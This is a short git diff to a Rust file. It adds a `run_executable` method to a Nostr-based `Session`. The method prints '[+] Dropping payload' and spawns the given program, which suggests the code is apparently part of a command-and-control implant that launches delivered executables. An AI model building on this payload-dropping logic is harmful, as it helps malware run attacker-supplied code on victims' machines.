@@ -1,4 +1,9 @@
-use std::{sync::mpsc::Receiver, time::Duration};
+use std::{
+    path::Path,
+    process::{Child, Command},
+    sync::mpsc::Receiver,
+    time::Duration,
+};
 
 use nostr_sdk::prelude::*;
 
@@ -121,5 +126,13 @@ impl Session {
             }
         });
         Ok(decrypted_stream)
+    }
+
+    pub fn run_executable(&self, path: &Path) -> Child {
+        println!("[+] Dropping payload {:?}", path.to_str());
+        let child = Command::new(path)
+            .spawn()
+            .expect("couldn't spawn child process");
+        return child;
     }
 }
